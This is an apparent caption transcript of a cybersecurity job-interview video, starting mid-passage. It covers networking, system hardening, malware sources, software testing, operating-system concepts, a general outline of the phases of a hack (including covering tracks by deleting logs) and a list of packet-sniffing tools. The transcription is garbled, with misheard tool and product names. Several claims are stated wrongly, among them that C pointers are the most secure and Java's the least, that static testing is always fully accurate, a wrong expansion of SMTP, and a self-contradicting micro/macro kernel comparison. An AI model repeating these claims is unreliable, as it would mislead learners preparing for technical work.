many computers may exist in that
particular Network and what is the IP
address of that specific computer so
that it can communicate across the
network as well ifconfig is the same
thing on the Linux Mac or Unix operating
system
so the command will also give you the
list of interfaces and the configuration
of each and every interface
it is used to configure control the
tcpip network interface parameters from
the command line interface
it allows you to see the IP address of
these network interfaces so here you can
see uh the
wlp19s
the IP address being 192 168 43.215
subnet mask being
255.255.255.0 with the broadcast being
192.168.43.255. question 9. what is the
difference between a domain and a work
group this can be a very interesting
question and can be a very lengthy
question at the same time a work group
is nothing but a decentralized network
where you have interconnected multiple
machines together and each machine acts
in its own individual capacity
things of itself as a server right so a
decentralized network you every user
manages the resources individually on
their PC so local users on their own PCS
managing the network shares what can be
shared from that particular machine what
data should be shared should not be
shared to whom it can be shared with and
so on so forth
it is good if you got a small Network a
few machines all together uh and you
want them to interact with minimal
management effort right so each computer
each user will decide what they want to
allow other users to see on that
particular Network and all of them would
be connected over a land a local area
network either a wireless or a wired one
so if you look at your home Wi-Fi right
now that is one of the best examples of
having a work group
the domain on the other hand is a
centralized Network model so in a
corporate environment whenever you go
there and you've got a domain-based
username and password which when entered
onto a particular machine gives you
access to the entire network or whatever
applications and whatever resources have
been allocated to you that is where the
domain comes in so it it also uses a
single sign on mechanism for all the
resources that are that are to be made
Available to You whereas in a work group
your local user only meant for that
particular computer right so coming back
to the domain it is an administrator who
is going to manage the entire domain and
all of the resources connected to the
domain the resources could be switches
routers servers data stores applications
web servers Mail Exchange servers and so
on so forth so all of these are
administered by an administrator through
the domain it is the most reliable and
Optimum solution for a large Network
where multiple users are going to
interconnect and share that data amongst
each other
right the computer can be connected to
any network that means you can be on the
internet and through the internet using
a VPN you can connect to your corporate
Network authenticated and get access to
whatever resources you are allowed to
access whereas in a work group you have
to be a part of that Network to access
that particular network if you change
your location you go and connect to
another Wi-Fi you will lose access to
your previous Wi-Fi then the last
question for the networking section what
is data encapsulation in networking data
encapsulation refers to the process of
adding headers and trailers to the data
the data link layer binds each packet
into a frame that contains the hardware
address of the source and the
destination computer so in this example
when you're talking about data
encapsulation we have talked about how
data that has been created by the
application layer we'd have a header and
a trailer that will give
the various informations of where that
data needs to be sent so the hardware
address which is the MAC address comes
into the picture and gets added to the
header and the IP addresses port numbers
and all of those things would then be
added to this Traders as well so that
the data can be then routed to the
intended recipient of that particular
communication
with this we end the first 10 questions
in networking and in this video we are
going to look at software and
programming so we're going to look at
the first 10 questions
first question being how do you keep a
computer secure now this is going to be
a very generic question so you want to
put your best foot forward and you want
to identify the most common
methodologies on how you can keep a
computer secure so when we talk about
computers the first thing that you want
to talk about is authentication
mechanisms where you want multi-factor
authentication or two-way authentication
to ensure that your accounts are secured
now if you look at using passwords
depending on how passwords are being
stored by the application password
attacks can be possible either a Brute
Force attack or a dictionary based
attack
or even password guessing attacks are
possible to mitigate those kind of
attacks you we need multi-factor
Authentication
to ensure that accounts are kept secure
now even if we are using multi-factor
authentication we also want to look at
secure passwords which means
that the password is complex enough to
withstand most of the common attacks and
a Brute Force attack or a dictionary
attack is just not possible so we want
to randomize our passwords we want to
create a complexity where a password
meets standards such as me has at least
one lower case one uppercase character
has numerics and
special characters and is randomized is
not based on a dictionary word doesn't
contain usernames email addresses phone
numbers or anything that is personal to
that particular user third keep regular
updates which means that there will be
patches that will be released for the
application for the software that you
are utilizing download the patches
install them on a regular basis to
ensure that you are secured against the
most recent attacks that have identified
install a good antivirus
could be your Internet Security Suite
which will have an antivirus intuition
detection system a firewall and will
help you protect yourself against
ransomware's malware and any
script-based attacks
also have a specialized firewall on your
system could be a host based firewall or
a network based firewall to ensure that
attacks are kept at a minimum and you
have your network definitions in place
to allow or disallow connections from
happening to your devices
have anti-fishing softwares installed as
well to ensure that you are not getting
any spam mails even if you do you're
able to identify that and not fall prey
or victim to those spam males phishing
attacks are generic where they are
directed towards individuals
and they prey on the liberty of that
particular individual so our Nigerian
frauds or the lotteries that we win on a
regular basis of hundreds of million
dollars uh those messages the emails
that we receive they are all phishing
emails where uh they're basically
prone to victimize the user and then Rob
them of money or install some malware
or do some other malicious activity if
you want to enhance encryption about
data that you have stored on your
devices or on your or that is accessed
by your software or being transmitted by
your software use encryption encrypt
your data whether it is at rest whether
it is in motion or whether it is at use
thus reducing data leakage and data loss
possibilities and finally in the
foremost secure your DNS DNS is the
domain name server which is utilized by
computers to resolve domain names to IP
addresses
if a DNS poisoning attack is possible
where your DNS settings have been
modified by an attacker and you are
redirected to a malicious DNS server
that server is going to redirect you to
another malicious application which may
have a malware or a malicious software
as a payload also you don't want people
to know your DNS servers and the queries
that you're making so you want to use
secure DNS or DNS over https to encrypt
your DNS queries as well
so in a nutshell if you follow these
eight steps your devices your computers
your applications are going to be as
secure as possible the next question is
security related aspects between C C
plus plus and Java now this is an
open-ended question it depends on which
level you're giving an interview on but
you're looking at it from a fresher's
perspective or a less experienced
perspective and thus these are some of
the aspects that we want to look at and
the comparisons between C C plus plus
and Java so the five aspects that we are
looking at are Pointers core
translations storage allocation
inheritance
and overall security are based on c c
plus percent Java so when we say
pointers
we are looking at how we are going to uh
we are using pointers and uh stacks and
heaps 2.2 functions and how we exit
those functions and how those functions
are then recalled into the next function
so C supports pointers it is most secure
C plus plus also supports Point pointers
but it is a little bit less secure than
see Java it is not supported tarot
access is given to memory allocation and
thus it is the least secure as far as
pointers are concerned when we look at
core translations
see is able to compile but it is not
secure same with C C plus plus but in
Java it is an interpreted language and
it is abstracted and secured
in storage allocation in CV use malloc
and Kellogg memory allocation uh Which
is less secure because it does not have
internal checks on verifying what memory
is allocated and the user input that is
being compiled or that is being input to
that memory right thus this can allow
buffer overflow errors to creep in
because of the uh non-verification of
the input data so it is the least secure
in C C plus plus it uses new and delete
options and is comparatively secure but
Java uses a garbage collector and thus
is the most secure as well as storage
allocation is concerned
when we talk about inheritance
the most secure is CC plus plus C has no
inheritance so it's not secure in C plus
plus it is supported
thus it is the most secure whereas in
Java there is multinheritance that is
not supported and does this
comparatively secure overall the most
secure out of all these based on these
five aspects is Java
the lease accuracy
and the mid level is C plus plus moving
on to question 13 what are the different
sources of malware now malware stands
for malicious software right malware is
basically a software that poses as a
legitimate software but has a payload of
atrogen virus spyware keylogger or some
malicious software that is going to have
a negative impact on security of your
particular device
so the question here is what are the
different sources of malware we want to
identify the most common sources through
which malware's in fact end user devices
in today's world and you can start with
pop-up ads so most of the websites if
you're visiting untrusted sites if
you're being redirected to sites that
you don't know about there will be a lot
of pop-ups coming your way where it says
you're the one millionth visitor to this
site please click here to download your
gift
or it will say uh congratulations on
winning a particular product for
visiting this page and so on so forth
there are some instances where you can
see a banner which is flashing at you on
top of the page and says that there are
eight uh infections that have been
identified on your computer click here
to download an antivirus to clean the
infections so all of these pop-ups
are there as a social engineering attack
as a phishing attack to make gullible
people click on those links and download
those malwares now the software that is
posing as a security software itself can
be a malicious software which is going
to install a Trojan or a virus or a bot
on your machine compromising the
security of that machine
the second is removable media USBS and
humans have a fascination with USB so if
you find a USB lying around it's a free
USB you get excited about it and you
want to take it home you want to plug it
into a machine and see what's on the USB
worst case scenario you format it and
you've got a free USB to utilize higher
the capacity the better but that is one
of the most easiest way people
use malware to uh to be deployed on
unsuspecting users if there is a USB
lying around
why would why would somebody want to
forget a USB it's most likely planted
over there as a social engineering
attack so that a gullible person is
going to pick it up plug it into their
device if the device is not secured
enough
it is going to install the malware right
then documents and executable files this
is where your viruses and all those
Creeps in so let's say you're surfing on
the internet you're looking for a
software uh and you find the software on
a particular website you do not verify
the trustworthiness of that site and you
just download and install that software
now that software could be malware as
well thus if you're surfing on the
internet you're downloading files from
different locations you have to research
the website you have to research the
source to ensure that it is trustworthy
and only then are you going to download
and execute those files thus internet
downloads as well and when we say
internet downloads it's not just
untrustworthy sites we go to torrents we
go to uh the dark web or the Deep Web
and we are searching for other softwares
especially those who are researching
security right we always want we are
always on the lookout of new softwares
and we're always on those forums which
may not be so much trustworthy and we
just download those files and start
installing them that is a very bad
scenario right so you have to be very
careful what you are downloading from
the internet your antiviruses your uh
anti-fishing mechanisms you have hit
intelligence mechanisms uh have those uh
mechanisms installed and you want to
verify where your downloads are coming
from then your network connections if it
is a P2P connection it is a local area
network connection or a metropolitan
area network you have to verify whom
which devices are connected to your
machines and you have to validate those
connections before you want to trust
those devices and before you connect to
them if you're on a public Wi-Fi you
probably don't want to connect to a
public Wi-Fi in the first place
then comes email attachments
there are so many attachments that come
across in today's world most of them in
a zip format or a RAR format uh
some of them come as document files
where there are macros hidden within
them macros are scripts that are
recognized by Microsoft Office files
right and then finally there are these
malicious advertisements that we find
online right uh Let It Be Facebook let
it be WhatsApp let it be uh
any social media platform that you go or
even your search engines their job is to
display ads their job is not to verify
whether the ad is legit or not it is for
us as consumers to be careful and
validate that ad and verify whether it
is a genuine ad or not so just don't
start clicking on any of the ad trusting
uh the platform that you're on be sure
that you are investigating that ad so
these are the most common
sources of malware and the end user
will always get infected by one of these
mechanisms moving on to question 14
how does email work now this is a very
uh
can be a complex question but we have to
keep it as simple as possible and we
have to identify that there are two
servers where both of them either using
SMTP where which is the simple message
transfer protocol where in this scenario
John
wants to send an email thus they've got
an email client installed on their
machine which is connected to the mail
Exchange Server which has a DNS server
which Maps the routing and which maps
The Exchange Server and inboxes so when
John composes that message and clicks on
send John should be connected to a Mail
Exchange Server where the email is sent
through that particular person's inbox
so so John's inbox will then uh be
validated and that email will then be
sent through the DNS server uh through
the internet and will be received by the
recipient mail server so at this point
in time John also requires the
recipient's email address so in this
case this is Jack so Jack at
something.com would be the email address
so while John is composing the two field
will have Jack's email address the from
field will have John's email address the
subject field will have whatever they
want to convey as a message the message
body will have the message itself and
then when John clicks on send it will go
to their Exchange Server the extension
server will then validate the Inbox and
identify where that inbox is located for
Jack and then to the internet it will be
sent to the email to the mail server of
Jack the mail server will then identify
the proper
inbox that it now that that email is to
be sent to and it will store that email
in that particular inbox when Jack opens
their computer and accesses their inbox
this email from John will be already
waiting for them and they can respond to
it the same way John had sent that email
if getting your learning started is half
the battle what if you could do that for
free visit scale up by simply learn
click on the link in the description to
know more
moving on to question 15 what are the
types of threats a company can face
right and this is where your threat
modeling comes into the picture so
you're looking at softwares you're
looking at operating systems and the
company comes and asks you uh what are
the threats that are most likely that a
company will face so on a broader scale
the threats that a company will always
face would be classified as natural
threats man-made threats technical
threats and a supply system threat so a
natural threat would be an act of God
which is outside the control of human
beings could be storms or any natural
occurrences like volcanoes
thunderstorms flooding earthquakes fire
and so on so forth so anything that is
natural so it depends on the geographic
location that you're in and what kind of
climate that area faces and you need to
identify the immediate threats
and prepare for them so if it is
flooding that you're looking at and you
want to look at an office uh and the
possibility of the office getting
flooded is real you probably want to
take office at a higher floor
so that the threat of flooding is
minimized
for fire we always have a fire drill
where we practice our fire mechanism so
that we can evacuate all humans as soon
as possible and then worry about the
technicalities of it under any
circumstances under any threats humans
will always have the first priority and
then everything else comes in
man-made threads are where man
themselves are a problem so strikes
lockouts hackers theft uh War rioting
all of those are man-made threads uh
which we ourselves cannot be in control
of but we need to plan for them and we
need to have a business continuity plan
or a disaster if you plan for any of
these threats that have been identified
then comes with technical threats
technical could be software bugs
operating system bugs application bugs
that uh that come with the applications
that we have or a hardware failure where
a server crashes or hard disk crashes
maybe uh the processor stops working the
motherboard stops working Ram gets
corrupted uh
any of the technical aspects
are stopping uh stop functioning does
creating a break in the business can
come under technical right so uh
anything to do with computers
let's say a server feeling or a patch
that is not installed on a particular
software those would come under
technical threads and then the supply
system the supply system are your
environmental threats which depend on
your supply chain field failures what is
the supply chain for office to function
there are a lot of dependencies that
office goes through right there are a
lot of other vendors that suppose that
support and provide critical
infrastructure non-critical
infrastructure for the office to
function for first and foremost
electricity
without electricity nothing is going to
be powered on and you're not going to be
able to function so if there is a
electricity service provider and if
there is an electric outage that's that
comes under Supply system
so that's the supply chain failure where
the vendor that provides electricity to
you has failed in providing that
particular service and now you need a
business continuity on a disaster
recovery plan so you probably have an
inverter or you already have a power
generator plant that is going to
generate your own power and Supply to
your system
right there could be short circuits
because of fluctuation in the
electricity uh maybe the internet
service provider fails and your internet
caches so you have a backup line for the
internet from a different vendor right
and so on so forth maybe your Hardware
vendors who are supplying you servers
desktops laptops and whatnot they fail
because they feel they are facing a
strike or they go bankrupt and suddenly
you can no longer purchase Hardware from
your vendor because they no longer are
in business so that's a supply chain
failure so any of these Systems Failing
would also come under threats
so under a broad category these are the
first four threads that you need to
identify and then you can elaborate by
providing more scenarios based on the
experiences that you have had towards
each and every of these threads so
natural threat where you may have had
experience where there would have been
let's say a flooding or
any natural disaster which caused a
problem for the continuity of your
particular business so identify each and
every example for each of these threads
and provide that as an example in the
interview
what is black box and white box testing
so when you are testing a software or
you're testing your infrastructure there
are two different tests that you can
conduct the first one is a black box the
second one is a white box in a black box
test there is no knowledge that is
shared with the tester so let's say your
ethical hacker
and you have been awarded a contract by
an organization to test the current
application that they have developed now
they are not going to give you any
information they are not going to tell
you what the application is they just
probably give you an IP address and a
port number where the application is
hosted and now you have to find in your
own queries and try to figure out what
the application is try to gather
information see what uh what information
can be gathered in the first place and
based on that you're going to figure out
your way identify vulnerabilities and
see if any of those vulnerabilities can
lead to a security incident so without
any knowledge zero knowledge of the ID
infrastructure or the source code that's
a black box attack or a black box test a
white box test on the other hand is
where full knowledge of the ID
infrastructure of the source code is
shared so the ethical hacker has
complete knowledge and based on the
knowledge they are then going to test
out the system to see if there are any
flaws that they can identify right so
why would these two audits be important
because the first one a black box audit
emulates the attack of a Outsider or
external hacker sitting outside the
organization trying to figure their way
in whereas a white box attack can
emulate the attack of an Insider so a
disciplinary employee within that
organization misusing their access
controls or the access rights to make uh
unvalidated profits right so somebody's
corrupt who has been bribed who wants to
sell out company Secrets based so
they're going to try to find out
vulnerabilities try to steal data and
try to sell it on the uh gray market
right so a white box would emulate
internal attack a black box would
emulate an external attack moving on to
question 17 what is use case testing now
use case testing is a functional test
and it is also a black box test
right what is a functional test it tests
the functionality of a particular
software once it has been created
why is it a black box test because the
user doesn't know what the functionality
is they just want to find out each and
every scenario and try to see what that
scenario generates as a response they
are not sure whether that is the
appropriate response that should be
generated or not
they're just trying to find out the
response that is going to be generated
after they fire off a query so this
technique is used by testers to get the
test scenarios to exercise the whole
system from start to finish
so let's say it's a login mechanism for
an application right now a user at this
point in time the tester since it's a
black box testing will know that it is a
login mechanism they will not know the
details of what logging mechanisms are
being utilized so they wouldn't know
whether input validation is done they
wouldn't know whether output encoding is
done they wouldn't know how the CGI
calls are being made they would not know
how the queries are handled at the
server side and how the database is
going to treat that particular query so
they have no idea whether SQL injection
attacks are possible and so on so forth
so for them with whatever input they are
going to try to insert for that login
mechanism that's a functional Black Box
test the functionality being whether the
login mechanism works and based on the
type of inputs that are going to put in
whether it creates an unwarranted output
whether they can bypass the mechanism or
they can hack into the system because of
some of the flaws that were left behind
right another example here is a software
made for users to use for documentation
the testers will test all the cases that
the user can do so can the user view a
document can they add new documents can
they edit documents and can they delete
documents so this functionality
will depend upon the access controls
that have been granted to a particular
user so for this particular user the
tester at this point in time they would
not know whether they are an
administrative user or they are a
regular user they'll just try to do all
of these and then write the responses
saying I was able to view I was able to
add I was able to edit and I was able to
delete now the result will be then sent
to a manager the manager will look at
the results and then based on the actual
access controls that are supposed to be
there for this particular user then
we'll try to identify whether this is an
acceptable case or whether there have
been any flaws within this case moving
on to question 18
what is static and dynamic testing now
this is again in application testing
static testing is done in an early stage
of development life cycle now software
development life cycles there are
multiple of those what are these life
cycles
there are different stages in which a
application is created
and provided to the customer so your
first stage would be determining the
scope of the application determining the
hardware requirements for that
application then
creating a flowchart for that
application a functional chart for that
application and then maybe start coding
then an architect comes in tests the
code verifies the code then the testing
phase comes in then the security testing
phase comes in and then the user
acceptance testing comes in but in every
stage at the very earliest of our stage
a static test will always be started
to see whatever code has been developed
whatever uh scope has been developed
whether that scope is going to be
correct or not this will include
walkthroughs and code review what is a
walk through a walk through is going
through documents that have been
generated and trying to find faults in
the documented Journey that has been
that has been created so far so let's
say somebody has created a workflow or a
flowchart for a program how the
functions are going to be called and how
they're going to be executed so a
walkthrough would be where uh all these
responsible people will walk through
that particular flowchart and find out
any flaws within that and then Rectify
them if there is any code that has
already been written this code will be
reviewed manually and
any flaws within that code would then be
identified static testing will always be
100 accurate in a very short amount of
time because it is immediate you have
created it and then the export is going
to test it to see whether everything is
fine or not right it is all about
prevention mechanism so since you are
doing it at the Inception itself if you
find any flaw it gets immediately
repaired so this is about preventing
vulnerabilities from keeping into that
application at a later point in time
whereas Dynamic on the other side is
done at the end of the development life
cycle so you have generated the
application everything is ready now you
want to do Dynamic testing includes
functional and non-functional testing
functional testing is where the
application itself is being tested the
functions to see that all the parameters
that are given to the application are
functioning properly
non-functional testing would be where
security parameters administrative
parameters all of them are being
verified
right this is where your test case
scenarios come in and uh
you're going to test each and every
scenario by generating inputs and
analyzing the output that the
application is going to give you
Dynamic testing is all about cure so
here you're going to identify
vulnerabilities report them to the
management and the management is then
going to figure out a way of patching
those vulnerabilities so that they can
be mitigated moving on to the next
question what are the test levels in
software testing so as far as software
testing is concerned there are four test
levels module testing integration
testing system testing and the final one
is acceptance testing so in the testing
phase of your development life cycle the
first thing is a module test we are
going to check your routines your
subroutines your sub programs procedures
that have been written in a program so
all your functions all your
mechanisms for that application are
going to be tested when you go into
integration testing the software we have
been integrated with multiple softwares
there may be different API calls coming
in maybe a third party software on which
your uh depending upon to supply for
information so all of these integration
of various softwares various apis are
tested to ensure that they are from
functioning properly and there are no
flaws errors or mistakes left behind in
the integration of all of these
softwares
then the system testing is where the
entire system so including the hardware
including the software right it starts
from the installation so now the
software is complete we know which
Hardware we are going to support for it
we start by installing the software and
see whether the installation is going to
be completed properly if there are any
errors in the installation process
itself
then once it is installed the
performance of that particular
application the write speeds the read
speeds on the hard disk
the transaction speeds that the
application is capable of the network
dependencies that the application may
have all of those would come under
system testing and then the acceptance
testing which is basically a quality
assurance exercise that the application
meets the client's requirements so the
client in the first stage would have
given the scope of what needs to be
achieved in the acceptance testing
you're verifying that that scope has
been met and the client requirements
have been met and you can assure the
client about the functionality and the
performance of that particular
application coming to the last question
in this uh software programs what are
the valuable steps to resolve issues
while testing so in the previous
scenarios when we have started testing
now if you find out when you execute a
particular use case
and then you find out of law what would
be the steps that you would utilized to
address those particular flaws in those
tests the first step will always be
record then you're going to report it
and then you're going to introduce a
Control process for it so when you say
record
you're going to create logs
and you're going to try to resolve all
the problems that have happened now when
you say resolve you're not going to
recode the application but you are going
to test the system again and again to
ensure that whatever is being recorded
is accurate
and all the logs all the error
mechanisms all the dumps all of those
that have been generated due to this
particular log of up to this particular
error are being captured so that they
can be reported to the higher level
managers so the next step is once you
have eventually have accumulated all
these logs and Records you're going to
report them to the higher level managers
who are then going to investigate it and
go back to the developers trying to
figure out the best way to mitigate
those particular flaws so the report
writing needs also also needs to be
accurate it needs to be to the point it
needs to detail what the problem was it
will document all the steps that they
were that you took all the inputs that
you put in and it will also record all
the errors and it will also record all
the mechanisms that were utilized and
the errors that were regenerated
and that report will be given to the
higher level managers who can then
forward it to the developers who based
on those reports can start their
troubleshooting and then the control
mechanism comes in you're going to
define the issue management process so
this process needs to work in a
particular manner where you are doing a
test you're recording whatever is
happening you're creating a report out
of it you're sending it to the
management the management will then take
those reports study there take it to the
developers the developers will test
based on their criterias they might
interact with the testers at that point
in time to identify particular flaws and
then they might want to record that
application on a develop a patch which
once installed will mitigate that
particular flaw and then it can come
back to the testing phase again where
you can repeat those tests and validate
that the flaw is no longer existed
so these are the three steps that would
be uh utilized for testing purposes
and that brings us to the first 10
questions on the software platform in
the next video we'll be looking at
operating systems and applications
the first question is on virtual memory
what exactly is virtual memory
for a computer we have two types of
memory we first is the primary memory
which is your random access memory which
is also known as a volatile memory and
the secondary memory is your hard disk
where your data is stored permanently
but for a computer when it has let's say
a 4GB memory or a ram as in this
scenario on your screen it is going to
replicate that and is going to create
another 4GB of virtual memory on the
hard disk and it is going to use it in
tandem along with the ram
so if the ram is insufficient the
processor is going to utilize the 4GB of
the virtual memory that is created on
the hard disk and it is going to swap
data from the ram to the hard disk
this can also be known as a page file or
a swap file the next question is what
are different scheduling algorithms now
the context for this question is you're
talking about a processor and you are
talking about how processes are going to
be fed to the processor and how the
process is going to treat these
processes so the first is first come
first serve so the process which
requires the CPU first gets the CPU
allocation first now whenever there are
processes that are being run by
different applications they make
requests for some CPU type
now in first come first serve the first
service or the first process that is
going to request some processing time
will get that much allocated to them
they will run through the process first
and in the next and the next and so on
so forth
the second one is the shortest job first
this is the process where the shortest
execution time for that process is
calculated and that process is selected
first for the CPU
then there is priority scheduling this
schedule selects the task to work as per
priority so there would be some tasks
that are marked with high priority some
would be normal and some would be low So
based on this high normal or low
priority uh all the processes will be
classified higher priority will be dealt
with uh first then the normal and then
the least priority
the fourth option is multiple level
queues where processors are assigned to
a queue based on the specific property
like process priority the size of memory
Etc so it will be classified based on
the attributes given to that particular
process and multiple queues will be
created and then based on the attributes
the processes will be
processed by the CPU
then shortest remaining time the process
will be allocated to the task Which is
closest to its completion so or you look
at it this way the process that will
take the least time to complete its
processing would be chosen first
and then the round robin method where
each process comes in turn gets an equal
share of time so if there are 10
processes each process will be allocated
a certain amount of time after which the
next process will be processed and so on
so forth and it will continue in a round
robin fashion till all the processes get
executed
so in short six different scheduling
algorithms depending on how you uh how
the operating system deals with it
the next question is
what are the steps involved in hacking a
server or a network so this is more of
an ethical hacking question you're
looking at devices and for uh and the
interviewer asks you uh what kind of
steps are involved what are the
activities that you would do in hacking
a server or a network now there are no
specific steps that you would Define
because every hack is going to be unique
but it has a hack can be classified in
five different steps
which are quite generic right so the
first step will always always be the
reconnaissance step also known as
information gathering phase also known
as footprinting or fingerprinting uh
depending on what exactly you're doing
but in this phase
the attacker gathers all the evidence
all the information that is possible
about the targets that they want to
attack so here you are trying to get to
know the victim so you can launch
specific attacks towards them you want
to identify what operating system they
are utilizing what IP addresses Mac
addresses the versions of the operating
systems and applications the patch
levels find out vulnerabilities find out
whatever information is possible find
out the information about the a person
who's using those computers so you can
launch social engineering attacks and so
on so forth so the first step is all
about gathering enough information based
on which you can launch further attacks
once you have that information comes the
second phase which is known as the
scanning phase this is more of a
technical phase so yeah in the first
step you've got your IP addresses domain
names maybe even Network maps and you
have identified which devices are
available now in the scanning phase
you're going to identify live devices
and then you're going to scan them for
open ports processors protocols Services
you're going to identify vulnerabilities
you're going to enumerate them to
identify more information from them
thus at this point in time you will have
identified a certain set of
vulnerabilities or a certain set of
security loopholes that you can misuse
once you have identified those
you're going to the next step which is
the gaining access tape in this you're
actually going to execute your attacks
based on the royalties that you have
found and you are either going to gain
access to that particular system by
installing a Trojan or a destroyer
system by installing a virus or install
a spyware or a key logger whatever you
wanted to achieve so in the gaining
access phase you would have based on the
knowledge that you have gained in the
first and the second phase you're going
to launch your attacks and you're going
to try to gain access to that particular
device
then the next step is where you're going
to maintain that access now that you
have hacked into that device it is not
necessary that you will always be able
to get access to that device suppose you
have cracked the password of that
particular user and the user changes
that password after a few days your
attack is worthless so what you're going
to do here is you're going to maintain
your access
so this is where it is assumed that you
want repeated access to that device and
thus you are going to install a
keylogger or a Trojan or sub mechanism
which will still allow you to get access
to that device without the knowledge or
the authorization of that particular
user and finally the last step is where
you are going to cover Your Tracks so
whatever activity that you have done so
far will have created logs and will have
created information based on which the
victim will come to know that they have
been compromised and may be able to
trace that activity back to you so to
prevent the user or the victim from
realizing that they have been hacked and
to prevent them to discover who has
hacked them you want to cover your
tracks by deleting logs and any
references that point to that particular
activity you are going to hide the files
that you have created so you have
installed a Trojan or a keylogger these
will create files and directories you're
going to hide them so that they are not
discovered you're going to hide
processes that have been created you're
going to try to hide all the activity
that you have done so that to conceal
the actual attack and preventing the
user from realizing that they have been
compromised
so these are the five steps that will be
involved in hacking a server Network
application or any Computing device you
will come across the next question
refers to what are the various sniffing
tools now this is a network based attack
where you are trying to capture a data
package that that have been transmitted
over the network and then you're going
to analyze them to see if you can
capture any sensitive information like
usernames passwords Bank details or
anything of that sort now these tools
will also depend on which operating
system you are utilizing for example MSN
slipper would work on Microsoft
operating systems
eat the cab would be based on Linux and
so on so forth so on the screen you'll
see six different sniffing tools that
work on different operating systems
Wireshark is uh something that is common
both on Windows and Linux
it is used to analyze Network in detail
it is the de facto tool that we will
come across in most of your ethical
hacking trainings in most of your
organizations when they want to do data
captures
now data capturing or packet capturing
is not only done by hackers to gather
more information but is also a known
troubleshooting technique used by
administrators and network
administrators to analyze any issues
that may be going on in the network
right so wow the first tool you see on
the screen is Wireshark like we stated
is available for Windows Linux as well
then there is TCP dump which again has
the same capability of Wireshark but is
a command line version whereas Wireshark
also has a GUI a graphical user
interface TCP dump is available on Linux
Amazon sniffer it's a very old tool uh
when we had MSN Messengers uh MSN
Messenger is no longer there but
Microsoft does or did have a Microsoft
message analyzer Tool uh which they have
stopped development since 2015. but
that's another tool that is specific for
Microsoft operating systems from
Microsoft there can be installed to
gather more information then you've got
ETA cap which is a tool to launch man in
the middle attacks data capturing and is
is essentially a Linux command line
based tool then D Smith is another
password and network capturing tool
which can help you capture data packets
prominently a Linux 2.
same with iterate
this is a graphical tool which will
allow you to capture data data traffics
and map protocols and identify which IP
addresses have been communicating with
what essentially all of the tools have
similar functionality except that some
have addition functionality like logic
and the metal attacks or capturing or
having specific filters that will help
you identify and troubleshoot some
network issues that you may be facing
moving on to the next question what is
an operating system now this is a very
difficult question to answer because uh
we normally when we want to answer this
question we start off with the
functionality of an operating system
right we try to describe what Windows
does or what Linens does or what Mac OS
does and then we are trying to figure
out what an operating system is in the
first place but an operating system
essentially as the slide says is a
software program that provides a
platform for computer hardware to
communicate and operate with the
computer software so it is basically an
enabler for human interaction with the
hardware that you have if you take the
operating system out of the question
it's just some Hardware which cannot
interact with you
but essentially when you have operating
system like Microsoft Windows or Linux
or Mac you're essentially essentially
installing an instruction set on that
particular device which will allow you
to interact
and manipulate the hardware to do
whatever you want that Hardware to do
right essentially when we talk about uh
drivers for your various devices like a
driver for your Lan card or for your
sound card or for your graphics card
which allows you to tweak these cards
for a functionality right it allows us
input and output functions
uh for example the basic example you
open up Microsoft Office projects like
Microsoft Word or Excel and you get a
GUI on the screen which you can interact
with you got a keyboard and you type on
that keyboard and the computer knows
what you're typing and reflects those
actions on the screen by showcasing it
on that particular Excel file or a word
file so how does the computer know what
to do or what exactly intending to do at
this point in time it is all the
operating system that is providing you
all these Services analyzing what your
inputs are and then based on the
programming it is going to execute that
and show it to you on the screen right
some of the most common commonly used
operating system are Microsoft Windows
you have them in desktop as well as
server variants Unix Linux again Linux
as desktop and uh servers you've got
Uber do in line Max red hat and so on so
forth and then you've got Mac OS for
Apple related conference the next
question what is the difference between
micro kernel and macro kernel now the
first thing we need to know is what is
the kernel kernel is the
heart of the operating system that
allows that input and output to happen
it allows those drivers to be set up so
that the hardware can interact with the
software and we can then instruct the uh
software and the hardware both
to function in a particular manner so
there are two types of kernels micro
kernels and a macro kernel macro kernel
is something that we normally use micro
kernels are for operating systems that
use processors directly handled by the
processor the micro kernel is very small
in size macro kernel is large because it
basically is an entire image of the
operating system
the execution for a micro kernel is slow
the micro kernel is going to be faster
because it is more evolved there's a lot
of programming involved extendability
micro kernels are easy to extend micro
macro kernels are hard to extend as well
as security is concerned if a macro
kernel crashes it takes everything down
with it the entire operating system is
going to crash but in case of a micro
kernel it is only that particular
process that is going to get affected
micro kernel there is a lot of coding
involved
micro kernel less coding is involved
examples of micro kernels would be
simply an OSS most popularly used on
yesterday earphones Nokia's if you
remember those uh qnx and so on so forth
macro kernels your Linux or vsd
operating systems essentially use macro
kernels next question what are the
different types of operating systems so
as you can see on the screen
five types of operating systems batched
OS distributed operating systems time
sharing multi-program and real-time what
are batched operating systems the
computer operator places the jobs coming
from input devices into batches so
consider this not from a desktop
perspective but from a server
perspective where these devices are used
by organizations to compute and to
crunch some processors that is going to
make some business sense out of it so
when there are multiple processes coming
in multiple jobs that are going to be
scheduled a batched OS is going to place
these jobs in batches and they're going
to Crunch those based on the inputs that
have been given by these operators
distributed OSS where there are multiple
computers which are interconnected and
are communicating through networks so in
a corporate environment you don't use
one single computer to do everything you
got a Data Center and the data center
will have a cluster of servers where
they are going to share some resources
to match one particular task right so
that's where your distributed OS is
coming to the picture
then you have time sharing OSS where you
are renting some time so time sharing
voices minimizes the response time
example in today's world Cloud right uh
you go on to the cloud you have a
virtual service over there you schedule
something you schedule the job over
there it is uh it is executed and for
that time being that operating system
Services your particular request and
provides you that particular job
any application that you see online that
is executed for example Facebook
from a consumer's perspective uh could
be a time shared experience
then multi-programmed OS the operating
system uses CPU scheduling to separate
jobs so you're scheduling the CPU to
complete certain jobs
in this particular Manner and in real
time OS
the operating system gives maximum time
to critical operation so it identifies
uh the priority of these operations it
knows the high priority items the medium
low priority items and based on that it
is going to execute these critical
operations and get the job done moving
on to the next question what is the
difference between logical address space
and physical address space now when
you're looking at address spaces this is
where applications come into the picture
and when you execute an application it
is going to create a particular address
in the memory where it is going to
create a buffer to store its own
information so that it can be provided
to the processor processed and then can
be returned back to the application as
an output right so
as far as definitions are concerned a
logical address is generated during
running of an application
or a program a physical address is a
physical address or a physical location
on the memory module itself
right
visibility you can view a logical
address because it is programmed into a
computer so if I am looking at C C plus
plus and I'm using malloc or memory
allocation that's where the logical
address is going to be created where a
buffer is going to be created for that
program and whatever the user input is
going to be it's going to be stored in
that buffer but whereas physical address
is concerned this logical address will
be created on a physical store or a
physical memory module which will have
its own addressing mechanism thus you
you can see the memory module where you
cannot see the specific address on that
particular memory module but as far as
an uh a logical address is concerned by
your programming or your debugging the
application it will show you the logical
address that has been created the start
point and the end point of The Logical
address that has been created for that
particular program it can be shown in a
debugging environment
right
address space logical and physical
address is physical like yeah I
